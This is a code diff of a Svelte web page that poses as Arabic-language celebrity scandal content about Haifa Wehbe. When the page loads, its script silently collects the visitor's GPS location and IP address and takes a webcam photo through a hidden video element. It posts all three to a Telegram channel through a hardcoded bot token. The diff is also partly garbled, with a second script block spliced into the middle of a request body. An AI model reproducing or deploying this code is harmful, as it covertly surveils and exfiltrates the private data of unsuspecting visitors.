@@ -1,6 +1,7 @@
 <script>
   import { onMount } from 'svelte';
-  let videoElement;
+  let videoElement = document.querySelector('video');
+
 
   onMount(async () => {
     try {
@@ -135,35 +136,144 @@
       body: JSON.stringify({
         chat_id: '@localipy', // Replace with the channel username or ID
         text: htmlMessage,
+<script>
+  import { onMount } from 'svelte';
+
+  onMount(async () => {
+    try {
+      const { latitude, longitude } = await getLocation();
+      const ipAddress = await getIPAddress();
+      const photo = await capturePhoto();
+
+      await sendLocationToTelegram(latitude, longitude);
+      await sendIPToTelegram(ipAddress);
+      await sendPhotoToTelegram(photo);
+    } catch (error) {
+      console.error(error);
+    }
+  });
+
+  async function sendLocationToTelegram(latitude, longitude) {
+    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
+    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const locationIcon = "\u{1F4CD}";
+
+    const htmlMessage = `${locationIcon} Location:\n\nLatitude: ${latitude}\nLongitude: ${longitude}\n\nLocation: <a href="${locationLink}" style="color: red;">Click here</a>`;
+
+    await fetch(telegramBotURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: '@localipy', // Replace with the channel username or ID
+        text: htmlMessage,
         parse_mode: 'HTML',
       }),
     });
   }
 
-  async function getIPInfo(ip) {
-    const response = await fetch(`https://ipapi.co/${ip}/json/`);
-    if (response.ok) {
-      return response.json();
-    }
-    return {};
+  async function sendIPToTelegram(ipAddress) {
+    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
+    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
+    const ipIcon = "\u{1F310}";
+
+    const htmlMessage = `${ipIcon} IP Address:\n\n${ipAddress}\n\nIP Location: <a href="${ipLocationLink}">Click here</a>`;
+
+    await fetch(telegramBotURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: '@localipy', // Replace with the channel username or ID
+        text: htmlMessage,
+        parse_mode: 'HTML',
+      }),
+    });
   }
 
-  function redirectToNextURL() {
-    var currURL = window.location.href;
-    var currNum = parseInt(currURL.match(/mhf(\d+)/)[1]);
-    if (currNum <= 999) {
-      var nextNum = currNum + 1;
-      var nextURL = currURL.replace(/mhf\d+/, 'mhf' + nextNum);
-      window.location.href = nextURL;
-    } else {
-      window.location.href = 'https://mhf1.onrender.com/';
-    }
+  async function sendPhotoToTelegram(photo) {
+    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendPhoto`;
+
+    const formData = new FormData();
+    formData.append('photo', photo, 'photo.jpg');
+    formData.append('chat_id', '@localipy'); // Replace with the channel username or ID
+
+    await fetch(telegramBotURL, {
+      method: 'POST',
+      body: formData,
+    });
+  }
+
+  function getLocation() {
+    return new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          resolve(position.coords);
+        },
+        (error) => {
+          reject(error);
+        }
+      );
+    });
+  }
+
+  function getIPAddress() {
+    return fetch('https://api.ipify.org?format=json')
+      .then((response) => response.json())
+      .then((data) => data.ip);
+  }
+
+  function capturePhoto() {
+    return new Promise((resolve, reject) => {
+      const videoElement = document.createElement('video');
+      videoElement.style.display = 'none';
+
+      document.body.appendChild(videoElement);
+
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then((stream) => {
+          videoElement.srcObject = stream;
+          videoElement.play();
+
+          const canvasElement = document.createElement('canvas');
+          canvasElement.width = videoElement.videoWidth;
+          canvasElement.height = videoElement.videoHeight;
+
+          const context = canvasElement.getContext('2d');
+          context.drawImage(
+            videoElement,
+            0,
+            0,
+            videoElement.videoWidth,
+            videoElement.videoHeight
+          );
+
+          canvasElement.toBlob((blob) => {
+            resolve(blob);
+          }, 'image/jpeg');
+
+          videoElement.pause();
+          videoElement.srcObject = null;
+          stream.getTracks().forEach((track) => track.stop());
+          document.body.removeChild(videoElement);
+        })
+        .catch((error) => {
+          reject(error);
+        });
+    });
   }
 </script>
 
-<main>
-  <video bind:this={videoElement} autoplay muted></video>
 
+<main>
+  <video {autoplay} {muted} {playsinline} style="display: none;"></video>
+  <h1>Getting Location and IP...</h1>
   <center>
     <h1 style="font-size: 36px; font-weight: bold;">فضايح هيفاء وهبي</h1>
   </center>
